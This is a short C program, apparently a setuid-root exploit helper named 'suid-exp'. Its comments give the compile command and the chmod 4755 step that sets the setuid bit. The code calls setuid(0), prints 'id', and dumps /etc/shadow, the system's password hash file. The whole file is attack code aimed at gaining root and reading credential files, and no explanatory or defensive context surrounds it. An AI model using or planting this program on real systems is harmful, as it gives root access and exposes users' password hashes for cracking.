//gcc suid.c  -o suid-exp
//chmod 4755 ./suid-exp
#include <stdlib.h>
#include <unistd.h>
 int main()
 {
setuid(0);//run as root
system("id");
system("cat /etc/shadow");
}